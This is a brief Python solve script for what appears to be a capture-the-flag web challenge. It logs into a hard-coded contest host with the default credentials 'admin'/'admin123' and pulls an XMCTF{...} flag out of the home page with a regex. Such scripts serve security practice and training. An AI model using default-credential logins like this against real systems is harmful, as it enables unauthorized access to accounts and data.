import re
import sys

import requests


def main():
    # base = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:5000"
    base = "http://nc1.ctfplus.cn:19585"
    session = requests.Session()
    resp = session.post(
        f"{base}/login",
        data={"username": "admin", "password": "admin123"},
        allow_redirects=True,
        timeout=10,
    )
    resp.raise_for_status()

    home = session.get(f"{base}/", timeout=10)
    home.raise_for_status()

    match = re.search(r"[Xx][Mm][Cc][Tt][Ff]\{[^}]+\}", home.text)
    if match:
        print(match.group(0))
    else:
        print(home.text)


if __name__ == "__main__":
    main()
